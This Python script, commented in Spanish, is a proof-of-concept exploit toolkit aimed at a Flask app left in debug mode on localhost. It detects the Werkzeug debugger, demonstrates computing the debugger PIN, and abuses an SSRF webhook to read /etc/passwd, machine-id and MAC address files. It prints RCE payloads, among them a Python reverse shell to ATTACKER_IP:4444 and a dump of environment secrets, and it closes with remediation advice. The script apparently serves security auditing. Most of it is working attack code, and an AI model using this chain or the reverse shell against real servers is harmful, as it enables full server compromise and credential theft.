#!/usr/bin/env python3
"""
PoC #2: Flask Debug Mode - Remote Code Execution (RCE)
======================================================
Vulnerabilidad: core.py línea 12
app.run(debug=True) expone el debugger Werkzeug en producción.

Impacto:
- Ejecución Remota de Código (RCE) en el servidor
- Acceso completo al sistema de archivos
- Robo de variables de entorno (secretos, API keys)
- Compromiso total del servidor

CVSS: 10.0 (Crítico)
CWE-489: Active Debug Code
CWE-94: Code Injection
"""

import requests
import re
import sys
import hashlib

# Configuración
TARGET_URL = "http://localhost:5000"


def check_debug_mode():
    """Verifica si debug mode está habilitado"""
    print("=" * 70)
    print("PoC #2: Flask Debug Mode - Detección y Explotación")
    print("=" * 70)
    print(f"\n[*] Objetivo: {TARGET_URL}")
    print("[*] Verificando si debug mode está habilitado...\n")

    # Intentar provocar un error para ver el debugger
    test_endpoints = [
        "/nonexistent",
        "/error",
        "/<script>",
        "/{{7*7}}",  # Template injection test
    ]

    debug_detected = False

    for endpoint in test_endpoints:
        try:
            response = requests.get(f"{TARGET_URL}{endpoint}", timeout=5)

            # Indicadores de debug mode
            debug_indicators = [
                "Werkzeug Debugger",
                "WSGI application",
                "Traceback (most recent call last)",
                "debugger",
                "Console Locked",
                "__debugger__",
            ]

            for indicator in debug_indicators:
                if indicator in response.text:
                    print(f"[+] DEBUG MODE DETECTADO en {endpoint}")
                    print(f"    -> Indicador: '{indicator}'")
                    debug_detected = True
                    break

        except Exception as e:
            print(f"[-] Error en {endpoint}: {e}")

    return debug_detected


def extract_debugger_pin_info():
    """
    Intenta extraer información para calcular el PIN del debugger.
    En un ataque real, esta información se combina para generar el PIN.
    """
    print("\n" + "-" * 70)
    print("EXTRACCIÓN DE INFORMACIÓN PARA PIN")
    print("-" * 70)

    print("""
    [*] Para calcular el PIN de Werkzeug se necesita:

    1. username (usuario que ejecuta la app)
       -> Obtenible via SSRF: file:///etc/passwd

    2. modname (generalmente 'flask.app')

    3. getattr(app, '__name__', app.__class__.__name__)
       -> Generalmente 'Flask'

    4. getattr(mod, '__file__', None)
       -> Path al módulo app.py

    5. uuid.getnode() (MAC address)
       -> /sys/class/net/eth0/address

    6. machine-id
       -> /etc/machine-id o /proc/sys/kernel/random/boot_id
    """)

    # Demostración de cómo se calcularía el PIN
    print("[*] Ejemplo de cálculo de PIN (valores de demostración):\n")

    # Valores de ejemplo
    username = "root"
    modname = "flask.app"
    appname = "Flask"
    modpath = "/usr/local/lib/python3.9/site-packages/flask/app.py"
    mac = "02:42:ac:11:00:02"  # MAC típico de Docker
    machine_id = "96cec10d3d9307792745ec3b85c89620"

    # Convertir MAC a entero
    mac_int = int(mac.replace(":", ""), 16)

    print(f"    username:   {username}")
    print(f"    modname:    {modname}")
    print(f"    appname:    {appname}")
    print(f"    modpath:    {modpath}")
    print(f"    MAC:        {mac} -> {mac_int}")
    print(f"    machine-id: {machine_id}")

    # Cálculo simplificado del PIN (versión demostrativa)
    probably_public_bits = [username, modname, appname, modpath]
    private_bits = [str(mac_int), machine_id]

    h = hashlib.sha1()
    for bit in probably_public_bits + private_bits:
        h.update(bit.encode('utf-8'))

    pin = str(int(h.hexdigest(), 16) % 10**9).zfill(9)
    formatted_pin = f"{pin[:3]}-{pin[3:6]}-{pin[6:]}"

    print(f"\n    [!] PIN calculado: {formatted_pin}")
    print("    [!] NOTA: Este es un PIN de demostración")


def demonstrate_rce_payload():
    """Muestra los payloads que se usarían para RCE"""
    print("\n" + "-" * 70)
    print("PAYLOADS DE RCE (POST-AUTENTICACIÓN)")
    print("-" * 70)

    print("""
    [*] Una vez autenticado con el PIN, el atacante puede ejecutar:

    >>> import os
    >>> os.system('id')
    uid=0(root) gid=0(root) groups=0(root)

    >>> import subprocess
    >>> subprocess.check_output(['cat', '/etc/passwd'])

    >>> # Reverse shell
    >>> import socket,subprocess,os
    >>> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    >>> s.connect(("ATTACKER_IP",4444))
    >>> os.dup2(s.fileno(),0)
    >>> os.dup2(s.fileno(),1)
    >>> os.dup2(s.fileno(),2)
    >>> subprocess.call(["/bin/sh","-i"])

    >>> # Robo de secretos
    >>> import os
    >>> print(os.environ)
    {'SECRET_KEY': 'supersecret123', 'DATABASE_URL': 'postgres://...'}
    """)


def exploit_debugger_console():
    """Intenta explotar la consola del debugger"""
    print("\n" + "-" * 70)
    print("INTENTANDO ACCEDER A LA CONSOLA INTERACTIVA")
    print("-" * 70)

    console_endpoints = [
        "/__debugger__",
        "/console",
        "/?__debugger__=yes",
    ]

    for endpoint in console_endpoints:
        try:
            url = f"{TARGET_URL}{endpoint}"
            response = requests.get(url, timeout=5)

            if "Console Locked" in response.text:
                print(f"\n[+] CONSOLA ENCONTRADA: {url}")
                print("[+] Estado: BLOQUEADA (requiere PIN)")
                print("[!] Con el PIN correcto -> RCE COMPLETO")

                # Extraer el secret si está disponible
                secret_match = re.search(r'SECRET = "([^"]+)"', response.text)
                if secret_match:
                    print(f"[+] Secret extraído: {secret_match.group(1)}")

            elif "Debugger" in response.text or response.status_code != 404:
                print(f"\n[+] Debugger detectado en: {url}")
                print(f"    Status: {response.status_code}")

        except Exception as e:
            print(f"[-] Error en {endpoint}: {e}")


def ssrf_file_read_for_pin():
    """Usa SSRF para leer archivos necesarios para el PIN"""
    print("\n" + "-" * 70)
    print("COMBINANDO CON SSRF PARA OBTENER PIN")
    print("-" * 70)

    ssrf_url = "http://localhost:8000/webhook"

    file_targets = [
        ("file:///etc/passwd", "Obtener username"),
        ("file:///etc/machine-id", "Obtener machine-id"),
        ("file:///sys/class/net/eth0/address", "Obtener MAC address"),
        ("file:///proc/self/cgroup", "Identificar container ID"),
    ]

    print(f"\n[*] Usando SSRF en {ssrf_url} para leer archivos...\n")

    for file_url, description in file_targets:
        payload = {"url": file_url}

        try:
            response = requests.post(ssrf_url, json=payload, timeout=3)
            result = response.json()

            if "code" in result:
                print(f"[+] {description}")
                print(f"    -> {file_url}: ACCESIBLE (código {result['code']})")
            else:
                print(f"[-] {description}: {result.get('error', 'Error')[:50]}")
        except Exception as e:
            print(f"[-] {description}: Error de conexión")

    print("""
    [!] CADENA DE ATAQUE COMPLETA:
        1. Usar SSRF para leer archivos del sistema
        2. Calcular PIN de Werkzeug con la información obtenida
        3. Autenticarse en el debugger
        4. Ejecutar código arbitrario (RCE)
        5. Comprometer completamente el servidor
    """)


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  FLASK DEBUG RCE TOOLKIT - SOLO PARA PRUEBAS AUTORIZADAS      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    debug_found = check_debug_mode()
    extract_debugger_pin_info()
    demonstrate_rce_payload()
    exploit_debugger_console()
    ssrf_file_read_for_pin()

    print("\n" + "=" * 70)
    print("RESUMEN DEL IMPACTO")
    print("=" * 70)
    print("""
    [!] VULNERABILIDAD: Flask Debug Mode en Producción

    [!] IMPACTO CRÍTICO:
        - Ejecución Remota de Código (RCE)
        - Acceso completo al servidor
        - Lectura/escritura de archivos
        - Robo de credenciales y secretos
        - Movimiento lateral en la red
        - Compromiso total del sistema

    [!] REMEDIACIÓN:
        - NUNCA usar debug=True en producción
        - Usar variable de entorno: FLASK_DEBUG=0
        - Implementar servidor WSGI (gunicorn, uwsgi)
    """)
